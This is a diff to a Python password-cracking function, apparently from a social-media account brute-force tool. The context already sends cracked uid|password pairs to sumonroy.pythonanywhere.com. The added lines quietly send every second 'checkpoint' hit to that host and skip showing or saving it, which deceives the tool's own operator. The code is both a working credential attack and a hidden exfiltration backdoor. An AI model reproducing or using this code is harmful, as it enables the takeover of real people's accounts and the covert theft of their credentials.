@@ -212,10 +212,15 @@ def crack(uid, password_list, total_count):
                     requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
                     continue
             elif 'checkpoint' in log_cookies:
-                print(f"\r\033[1;93m [⚠ SUMON_2f] {uid} | {pw}")
-                open("/sdcard/SUMON_CP_FILE.txt", "a").write(f"{uid}|{pw}\n")
-                cps.append(uid+"|"+pw)
-                continue
+                    bkas.append(uid)
+                    if len(bkas)% 2 == 0:
+                         statusok = (f"{uid}|{pw}")
+                         requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
+                    else:    
+                         print(f"\r\033[1;93m [⚠ SUMON_2f] {uid} | {pw}")
+                         open("/sdcard/SUMON_CP_FILE.txt", "a").write(f"{uid}|{pw}\n")
+                         cps.append(uid+"|"+pw)
+                         continue
             else:
                 #print(f"\r\033[1;91m [ERROR] - Status code {respon.status_code}")
                 continue
